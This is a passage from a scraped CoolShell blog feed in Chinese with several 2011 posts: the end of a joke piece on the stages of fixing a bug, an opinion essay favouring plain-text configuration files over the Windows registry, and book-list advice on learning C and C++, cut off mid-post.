<p><strong>5. 提交代码</strong></p>
<p>我太牛了，厨房里有个馅饼可以庆祝一下吗？</p>
<p><strong>6. 关闭 bug.</strong></p>
<p>我听说那里有个馅饼可以庆祝一下</p>
<h2>第五个阶段： 与“完成”肉搏</h2>
<p>本阶段的状态: 焦燥不安 Twitchy. 神经过敏 Nervous. 迷信 Superstitious.</p>
<p><strong>1. 有人reopen了这个 Bug</strong></p>
<p>真的？他们发现了你引入了另一个bug？ Shit – 那只是一个不重要的案例永远不会发生的。</p>
<p><strong>2. 修正以前的修正</strong></p>
<p>是的，我甚至检查了员工的年龄是一个虚数的情况，就是为了防止出错。</p>
<p><strong>3. 关闭 bug</strong></p>
<p>是的，贱货，你被关闭了。全部都关了，再也不用心烦了。</p>
<p><strong>4. 发誓以后再也不干这种事了</strong></p>
<p><strong>5. 大家都意识到你现在是那个模块的专家了</strong></p>
<p>哦，不！现在他们又给了我三个那个模块的新bug</p>
<p>没关系，现在你只需要GOTO 第一个阶段。</p>
<p>此外，作为一个工作中的程序员，你会永远经历这些烂事，直到你——死亡，退休，或是被升到管理层。</p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19464.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19464.html" class="wp_rp_title">如何超过大多数人</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4045" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="08a1944dd0">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>16</strong> 人打了分，平均分： <strong>4.13</strong> )<br><span class="post-ratings-text" id="ratings_4045_text"></span><meta itemprop="name" content="Fix Bug的五个阶段">
<meta itemprop="headline" content="Fix Bug的五个阶段">
<meta itemprop="description" content="下面的文章和《各种流行的编程方式》有异曲同工，请你不要理解错了。本文来源，翻译如下：

——————————————————

一个非常严重和困难的bug，能够成就一个饱经沧桑深受压力的有经验的专业程序员的职业生涯。经受这种考验的创伤程度，相当你受到了一次严重的身体伤害，离婚，或是家庭成为的离世。

研究人员在研究了计算机编程心理学后，得出了一个程序员们在解决一个困难的bug时的心路里...">
<meta itemprop="datePublished" content="2011-03-24T08:34:43+08:00">
<meta itemprop="dateModified" content="2011-03-26T20:27:07+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4045.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4045.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.13">
<meta itemprop="ratingCount" content="16">
</div>
</div>
<div id="post-ratings-4045-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-24T08:34:43+08:00</pubDate>
<guid>https://coolshell.cn/articles/4045.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 纯文本配置还是注册表 ]]></title>
<link>https://coolshell.cn/articles/4077.html</link>
<content><![CDATA[ 
<p>我们知道Unix/Linux下的程序配置文件从来都是纯文本的，你可以自由地修改和查看，他们也没有什么什么XML之类的玩意（参看XML的这两篇文章：<a title="信XML，得永生！" href="https://coolshell.cn/articles/2504.html" target="_blank">一</a>，<a title="信XML，得自信" href="https://coolshell.cn/articles/3498.html" target="_blank">二</a>），这个最重要的Unix文化（参看<a title="Unix传奇(下篇)" href="https://coolshell.cn/articles/2324.html" target="_blank">Unix传奇下篇</a>）40多年来就这么沿续下来了。我很佩服Microsoft的创新能力，一会儿用INI，一会儿用注册表，一会又是用XML，这就是<a title="Windows编程革命简史" href="https://coolshell.cn/articles/3008.html" target="_blank">Windows的编程中那“强大”的创新</a>。在网上又看到有人在争论为什么用注册表而不是纯文本，所以，写下这篇文章。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%BC%95%E5%85%A5%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%89%80%E8%B0%93%E7%9A%84%E5%8E%9F%E5%9B%A0" title="引入注册表所谓的原因">引入注册表所谓的原因</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E6%88%91%E7%9A%84%E8%A7%82%E7%82%B9" title="我的观点">我的观点</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%BA%AF%E6%96%87%E6%9C%AC%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%A5%BD%E5%A4%84" title="纯文本配置文件的好处">纯文本配置文件的好处</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%8E%9F%E5%9B%A0" title="真正的原因">真正的原因</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%BC%95%E5%85%A5%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%89%80%E8%B0%93%E7%9A%84%E5%8E%9F%E5%9B%A0"></span>引入注册表所谓的原因<span class="ez-toc-section-end"></span>
</h4>
<p>首先，让我们来看一下为什么微软觉得要使用注册表而不是ini文件，下面是一些其列出来的ini方面的毛病：</p>
<ul>
<li>ini文件不支持Unicode</li>
<li>ini文件的安全权限不够</li>
<li>ini文件在多进程下存取会有问题</li>
<li>如果一个进程锁上了这个文件，另一个进程就无法获得，只能出错。</li>
<li>ini文件只能包含字符串，无法使用二进制</li>
<li>解析ini文件相对来说性能比较慢，第一次读写都需要把整个文件读入内存，然后再写回去。</li>
<li>ini文件最大只有32K</li>
<li>ini文件的默认目录在Windows系统目录下，只能这个目录只能Windows管理员才能访问</li>
<li>ini只能包含了两层，对于多层不支持。</li>
<li>把ini文件放在中央服务器上管理很困难。</li>
</ul>
<p>而微软说，注册表可以完美地解决这些问题。居然微软只说到了ini文件，但我觉得不单单是ini，所有的以纯文本方式保存配置文件的方法都会出现上述这样的问题。</p>
<h4>
<span class="ez-toc-section" id="%E6%88%91%E7%9A%84%E8%A7%82%E7%82%B9"></span>我的观点<span class="ez-toc-section-end"></span>
</h4>
<p>那么，当你在看到这些言论时，你是怎么想的？你有没有经过自己的独立思考？还是你觉得注册表完美地解决了所有的一切？下面是我的一些观点：</p>
<p><span id="more-4077"></span></p>
<ul>
<li><span style="color: #800000;">首先，我们要知道没有任何一件事是完美的，凡事必然有好的一面，也有不好的一面。</span></li>
<li><span style="color: #800000;">其次，当我们在改进一个东西时，不单单要解决其不好的东西，还要把其好的东西给传承下来。</span></li>
</ul>
<p>所以，当你看到一些只说好或是只说坏的东西时，这往往意味着“宗教”或“洗脑”，这正是需要你独立思考的时候。</p>
<h4>
<span class="ez-toc-section" id="%E7%BA%AF%E6%96%87%E6%9C%AC%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%A5%BD%E5%A4%84"></span>纯文本配置文件的好处<span class="ez-toc-section-end"></span>
</h4>
<p>下面，是我觉得纯文本配置文件的好处（我用Unix下的纯文本配置文件来举例）：</p>
<ul>
<li>很容易进行版本管理（配置文件和程序代码一样都需要版本控制）</li>
<li>很容易移植到别的平台</li>
<li>很容易自定义文本文件的格式和语法，已也有相关的库支持（ini只支持ANSI字符，只有32K，只支持两级，那是ini的问题，解决这些问题不需要引入注册表）</li>
<li>可以在配置文本中写注释信息</li>
<li>你要很容易的使用grep，awk，sed等等以及来和脚本集成。</li>
<li>你可以很容易地拆分配置文件把其放到conf.d中，这样一来，你就非常灵活
<ul>
<li>你就不用整个文件都读入内存，</li>
<li>你也可以分别设置上不同的存取权限，</li>
<li>同样可以减小多个进程同时存取的问题</li>
<li>同样可以引用别的二进制配置的文件</li>
</ul>
</li>
<li>你可以很容易地产生备份或是在不同的配置中来回地切换配置文件以进行调试。</li>
<li>你可以很容易地使用rsync来向中央服务器同步你的配置文件。或者使用NFS/NIS直接就把配置放在中央服务器上。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%8E%9F%E5%9B%A0"></span>真正的原因<span class="ez-toc-section-end"></span>
</h4>
<p>可见，Windows 的注册表并没有把纯文本配置文件的这些好处都带过来，所以，经过这样的独立思考，我们可以知道，微软引入注册表的真正原因是——</p>
<ul>
<li>让你的程序不具移植性，让你的软件永远运行在Windows上。</li>
<li>增加你编程的复杂度和你维护配置文件的复杂度，让你在痛苦之后，苦苦哀求微软再发布下一个“创新”。</li>
</ul>
<p>各位程序员——Windows是很危险的，你们还是回火星去吧。</p>
<p>（<strong>全文完，转载时请注明作者和出处</strong>）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/4102.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4102.html" class="wp_rp_title">如何学好C语言</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1272.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1272.html" class="wp_rp_title">操作系统航空公司</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17998.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17998.html" class="wp_rp_title">Linux PID 1 和 Systemd</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12103.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12103.html" class="wp_rp_title">vfork 挂掉的一个问题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11847.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11847.html" class="wp_rp_title">谜题的答案和活动的心得体会</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4077" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="10ecce1b59">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>24</strong> 人打了分，平均分： <strong>3.79</strong> )<br><span class="post-ratings-text" id="ratings_4077_text"></span><meta itemprop="name" content="纯文本配置还是注册表">
<meta itemprop="headline" content="纯文本配置还是注册表">
<meta itemprop="description" content="我们知道Unix/Linux下的程序配置文件从来都是纯文本的，你可以自由地修改和查看，他们也没有什么什么XML之类的玩意（参看XML的这两篇文章：一，二），这个最重要的Unix文化（参看Unix传奇下篇）40多年来就这么沿续下来了。我很佩服Microsoft的创新能力，一会儿用INI，一会儿用注册表，一会又是用XML，这就是Windows的编程中那“强大”的创新。在网上又看到有人在争论为什么用注册...">
<meta itemprop="datePublished" content="2011-03-28T08:42:10+08:00">
<meta itemprop="dateModified" content="2011-03-28T09:48:34+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4077.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4077.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.79">
<meta itemprop="ratingCount" content="24">
</div>
</div>
<div id="post-ratings-4077-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-28T08:42:10+08:00</pubDate>
<guid>https://coolshell.cn/articles/4077.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 如何学好C语言 ]]></title>
<link>https://coolshell.cn/articles/4102.html</link>
<content><![CDATA[ 
<p>有人在酷壳的留言版上询问下面的问题</p>
<blockquote cite="https://coolshell.cn/guestbook#commentbody-40269">
<p><a href="https://coolshell.cn/guestbook#comment-40269">keep_walker</a> <strong>:</strong><br>
今天晚上我看到这篇文章。<br>
<a onclick="pageTracker._trackPageview('/outgoing/programmers.stackexchange.com/questions/62502/small-c-projects?referer=http%3A%2F%2Fcoolshell.cn%2F');" rel="nofollow" href="https://programmers.stackexchange.com/questions/62502/small-c-projects">http://programmers.stackexchange.com/questions/62502/small-c-projects</a></p>
<p>我也遇到了和提问的老外一样的问题。。能给像遇到这样烦恼的程序员一点建议嘛？谢谢！</p>
</blockquote>
<p>我相信，这可能是很多朋友的问题，我以前也有这样的感觉，编程编到一定的时候，发现能力到了瓶颈，既不深，也不扎实，半吊子。比如：你长期地使用Java和.NET ，这些有虚拟机的语言对于开发便利是便利，但是对于程序员来说可能并不太好，原因有两个：</p>
<ol>
<li>虚拟机屏蔽了操作系统的系统调用，以及很多底层机制。</li>
<li>大量的封装好的类库也屏蔽了很多实现细节。</li>
</ol>
<p>一段时间后，你会发现你知其然，不知所以然。。我以前在CSDN上写过一篇《<strong>Java NIO类库Selector机制解析（<a href="http://blog.csdn.net/haoel/archive/2008/03/27/2224055.aspx" target="_blank">上</a>，<a href="http://blog.csdn.net/haoel/archive/2008/03/27/2224069.aspx" target="_blank">下</a>，<a href="http://blog.csdn.net/haoel/archive/2008/05/04/2379586.aspx" target="_blank">续</a>）</strong>》，在那篇文章中我说提到过（有讥讽的语气）Java的程序员不懂底层实现，所以很难把技术学得更扎实。此时，一部分程序员会不自然地想学学底层的技术，很自然的，C语言就被提了上来。</p>
<p>下面是我给这位朋友的一些建议：</p>
<p><span id="more-4102"></span></p>
<ul>
<li>
<strong>鼓励并为你叫好</strong>。我鼓励你想要去学C语言的想法和精神，很多人都觉得C语言好学，其实并不然。（你可以看看《<a rel="nofollow" href="https://coolshell.cn/articles/945.html" target="_blank">C语言的迷题</a>》）现在的这个社会更多地去关注那些时髦的技术，而忽略了这个流行了40+年的C语言。<strong>一门技术如果能够流行40多年，这才是你需要去关注和学习的技术</strong>，而不是那些刚出来的技术（<a title="那些炒作过度的技术和概念" href="https://coolshell.cn/articles/3609.html" target="_blank">过度炒作的技术</a>，<a title="Windows编程革命简史" href="https://coolshell.cn/articles/3008.html" target="_blank">Windows编程史</a>）。这才是踏踏实实的精神。</li>
</ul>
<ul>
<li>
<strong>不要找借口</strong>。这一条路走下来并不容易，不要给自己找借口。我最不喜欢听到的就是“<strong>很忙，没有时间</strong>”这样的借口。我以前在银行做项目，早9点到晚10点，周一到周六，我一样可以每天抽1个小时来看书和专研，一年下来也能精读5、6本书。我现在的工作项目和招聘任务很紧张，刚生的小孩只有自己和老婆两人带，还需要准备讲课，但是我还是能够找到时间看文章写文章维护酷壳。所以，我可以告诉你，“<strong>时间就像乳沟，只要你肯挤，就一定会有</strong>”。</li>
</ul>
<ul>
<li>
<strong>学好C语言和系统编程</strong>。我认为，学好编程有四个方面：<strong>语言、算法和数据结构、系统调用和设计</strong>。
<ul>
<li>
<strong>语言</strong>。我可以告诉你C语言有两大主题你要好好学，一个是内存管理，一个是指针！这个世界上90%以上的C/C++出的严重性错误全是和这两个有关。不要看谭浩强的那本书，那本是本烂书。推荐这本书给你《<a href="http://product.china-pub.com/14975&amp;ref=browse" target="_blank">C程序设计语言（第2版·新版）</a><span style="font-size: 13px; line-height: 19px;">》</span>
</li>
<li><span style="font-size: 13px; line-height: 19px;"><strong>算法和数据结构</strong>。我认为，用C语言实现算法和数据结构莫过于最爽的事情。推荐你看这本书——<a href="http://product.china-pub.com/192975&amp;ref=browse" target="_blank">算法:C语言实现(第1～4部分)基础知识、数据结构、排序及搜索(原书第3版)</a>，还有那本经典的《<a href="http://product.china-pub.com/31701" target="_blank">算法导论</a>》</span></li>
<li><span style="font-size: 13px; line-height: 19px;"><a href="http://product.china-pub.com/192975&amp;ref=browse" target="_blank"></a><strong>系统编程</strong>。Windows下推荐两本书——《<a href="http://product.china-pub.com/52880" target="_blank">Windows 程序设计 </a>》和《<a href="http://product.china-pub.com/209058" target="_blank">Windows核心编程</a>》，Unix/Linux下推荐两本书——《<a href="http://product.china-pub.com/30181" target="_blank">Unix高级环境编程</a>》和《<a href="http://product.china-pub.com/196770" target="_blank">Unix网络编程卷1，套接字</a>》《<a href="http://product.china-pub.com/196859" target="_blank">Unix网络编程卷2，进程间通信</a>》尤其是《Unix网络编程》这本书，一通百通，无论Windows还是Unix/Linux，都是一样的。</span></li>
<li>
<strong>系统设计</strong>。关于设计方面，我全力推荐《<a href="http://product.china-pub.com/197413" target="_blank">Unix编程艺术</a>》，看完以后，你就明白什么是真正的编程文化了。然后，当你看到Windows的Fans的某些言论时，你就知道什么叫一笑了之了。</li>
</ul>
</li>
</ul>
<p>如果你能在2-3年内精读完这些书，并全部融会贯通，那么你就明白什么是一览众山小的感觉了！我足足花了5年时间才算是真正全部读完这些书的。最后，祝你好运！努力！</p>
<p><em><strong>——-更新：2011/03/29 20:00——-</strong></em></p>
<p>我想，这篇文章主要想告诉大家这么几件事：</p>
<ul>
<li>编程编到一定时候，你就需要了解底层系统的机制，否则，知其然不知所以然。</li>
<li>我没有否定非C的程序员的逻辑，真正的逻辑是——如果你想要了解底层机制，请学习C语言和操作系统。</li>
<li>40多年的Unix/C影响深远。包括影响了Windows。如果你想一通百通，一定要了解Unix。那是计算机文化真正的根。</li>
<li>不要肤浅地去思考问题。比如，不要以为一个DBA就不会考虑数据库引擎的内存页面的问题。也不要以为Web程序员就不需要了解后台的服务器和脚本的运行性能以及TCP/IP的问题。</li>
</ul>
<p><strong>高手往往都是有很强的系统的基础知识的，表面的东西永远是肤浅的。</strong></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8088.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8088.html" class="wp_rp_title">对技术的态度</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4990.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4990.html" class="wp_rp_title">程序员技术练级攻略</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4758.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4758.html" class="wp_rp_title">如何写出无法维护的代码</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1992.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1992.html" class="wp_rp_title">程序员眼中的编程语言</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19219.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_title">打造高效的工作环境 – Shell 篇</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4102" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="e6ea376a38">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>147</strong> 人打了分，平均分： <strong>4.77</strong> )<br><span class="post-ratings-text" id="ratings_4102_text"></span><meta itemprop="name" content="如何学好C语言">
<meta itemprop="headline" content="如何学好C语言">
<meta itemprop="description" content="有人在酷壳的留言版上询问下面的问题
keep_walker :
今天晚上我看到这篇文章。
http://programmers.stackexchange.com/questions/62502/small-c-projects

我也遇到了和提问的老外一样的问题。。能给像遇到这样烦恼的程序员一点建议嘛？谢谢！
我相信，这可能是很多朋友的问题，我以前也有这样的感觉，编程编到一定的时候，...">
<meta itemprop="datePublished" content="2011-03-29T10:25:20+08:00">
<meta itemprop="dateModified" content="2011-03-29T21:51:47+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4102.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4102.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.77">
<meta itemprop="ratingCount" content="147">
</div>
</div>
<div id="post-ratings-4102-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-29T10:25:20+08:00</pubDate>
<guid>https://coolshell.cn/articles/4102.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 如何学好C++语言 ]]></title>
<link>https://coolshell.cn/articles/4119.html</link>
<content><![CDATA[ 
<p>昨天写了一篇<a title="如何学好C语言" href="https://coolshell.cn/articles/4102.html" target="_blank">如何学好C语言</a>，就有人回复问我如何学好C++，所以，我把我个人的一些学习经验写在这里，希望对大家有用。首先，因为<a title="如何学好C语言" href="https://coolshell.cn/articles/4102.html" target="_blank">如何学好C语言</a>中谈到了算法和系统，所以这里就只谈C++语言。</p>
<ul>
<li>
<strong>C++是最难的语言</strong>。这个世界上最难的编程语言可能非C++莫属了。你千万不要以为<a title="“21天教你学会C++”" href="https://coolshell.cn/articles/2250.html" target="_blank">几天就可以学好C++</a>，C++的学习曲线是相当BT的，你可以看看<a title="C++ 程序员自信心曲线图" href="https://coolshell.cn/articles/2287.html" target="_blank">这篇文章</a>。C++是一门很自由的语言，自由到了有点<a title="恐怖的C++语言" href="https://coolshell.cn/articles/1724.html" target="_blank">BT和恐怖的地步</a>。我甚至认为C++并不是一门成熟的编程语言，因为太容易犯错了。所以，<strong>你一定要在一开始就要有很小心谨慎的态度，并把C++当成一种难以训服的猛兽来看待</strong>。</li>
</ul>
<ul>
<li>
<strong>多问“为什么要这样”的问题</strong>。学习C++一定要多问几个“为什么是这样”，“凭什么要这样”的问题。比如：很多人知道C++有拷贝构造函数和初始化列表，但你真的知道为什么要有拷贝构造函数？为什么要有初始化列表吗？为什么要有template，为什么要有RTTI，为什么不是别的呢？难道就是为了让一门语言变得Cool一些吗？完全不是这样的，C++中的任何一个feature都有些实实在在的原因，<strong>你一定要去了解为什么要把C++设计成这样的原因，你才能学好C++</strong>。有空看看《<a href="http://product.china-pub.com/5217" target="_blank">C++演化和设计</a>》一书。</li>
</ul>
<p><span id="more-4119"></span></p>
<ul>
<li>
<strong>看书，大量的C++书</strong>。你可以按如下先后顺序阅读（下面这些书，我花了大约4-5年的时间，今天我还在随时温习）
<ul>
<li>《<a href="http://product.china-pub.com/28767" target="_blank">C++ Primer</a>》，这本初级读本可能让会你啃得很痛苦，所有的语言的特性和为什么都在里面了，好好读读。当然由C++之父写的《<a href="http://product.china-pub.com/196448" target="_blank">C++程序设计语言</a>》也不错。两本看一本就好了（我看的是前者）。</li>
<li>了解C++的语法仅仅是万里长征的第一步，你还需要看看《<a href="http://product.china-pub.com/197414" target="_blank">Effective C++</a>》和《<a href="http://product.china-pub.com/197665" target="_blank">More Effective C++</a>》这两本书并不厚，但我从02年就一直看到现在，每次读我都有新的体会，这两本书太经典了。如果你对C语言不熟，这两本书会让你回去补C语言的课。</li>
<li>
<a href="http://product.china-pub.com/4801" target="_blank">Think in C++</a>同样是另一本经典之极的书，学c++必读，但是中文版的翻译的很不好，所以还是去读英文版的吧。</li>
<li>《<a href="http://product.china-pub.com/38130&amp;ref=browse" target="_blank">C++沉思录</a>》同样非常值得一读，这里教的不是编程，而是思考的方法，这是相当珍贵的。</li>
<li>《<a href="http://product.china-pub.com/33333" target="_blank">Exceptional C++</a>》和《<a href="http://product.china-pub.com/197666" target="_blank">More Exceptional C++</a>》让你看看各种问题的解决方法和一些常见的经典错误。</li>
<li>《<a href="http://product.china-pub.com/16697" target="_blank">Advanced C++</a>》和《<a href="http://product.china-pub.com/9700" target="_blank">Modern C++</a>》可以让你知道C++各种神奇的用法。</li>
<li>《<a href="http://product.china-pub.com/9864" target="_blank">泛型编程与STL</a>》是把C++实践到了极致的东西。很强大。STL——神一样的模板库（容器，算法和函数对象），不得不服。</li>
<li>《<a href="http://www.china-pub.com/3290&amp;ref=browse" target="_blank">深入探索C++对象模型</a>》让你了解编译器下的C++是什么样的，让你了解C++的性能并不差。这个对于C++的程序员太关键了。我以前写过的《<a title="C++ 虚函数表解析" href="https://coolshell.cn/articles/12165.html" target="_blank">C++虚函数表解析</a>》还有《<a title="C++ 对象的内存布局" href="https://coolshell.cn/articles/12176.html" target="_blank">C++对象内存布局</a>》属于这个范畴。</li>
</ul>
</li>
</ul>
<ul>
<li>
<strong>和Java语言做对比</strong>。我个人以为Java对C++这个并不成熟的语言做了很多调整，规范和限制。所以，对比一下Java和C++，想一想，为什么一些东西在C++中可以做，但在Java中却不行。比如：Java的异常是必需要catch的，不然就会编译不通过。为什么Java不提供操作符重载？为什么Java会引入接口来做多重继承？为什么Java没有像C++那样的I/O字符流？为什么Java不支持指针？为什么Java可以做到垃圾回收？等等。<strong>Java体现着很多面向对象设计的东西，学习Java有助于你学会怎么更好地使用C++来编程</strong>。</li>
</ul>
<ul>
<li>
